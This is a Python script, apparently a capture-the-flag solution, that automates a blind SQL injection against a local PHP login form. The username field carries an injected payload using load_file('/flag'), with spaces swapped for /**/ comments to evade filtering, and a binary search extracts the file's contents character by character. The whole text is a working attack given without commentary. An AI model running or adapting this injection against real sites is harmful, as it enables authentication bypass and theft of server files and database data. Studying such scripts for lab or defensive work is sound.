import requests
url = 'http://localhost/index.php'
def func(x):
	x = x.replace(' ','/**/')
	return x
flag = ''
def check(mid,mystr):
	username = """hack' or binary (select load_file('/flag'))>='{0}'#"""
	username = func(username)
	username = username.format(mystr)
	password = 'hack'
	r = requests.post(url=url,data={'username':username,'password':password})	
	return 'success' in r.content
		
for i in range(1,20):
	left = 0
	right = 255
	while left < right:
		mid = (left+right+1)>>1
		if check(mid,flag+chr(mid)):
			left = mid
		else:
			right = mid-1
	flag += chr(left)
	print flag
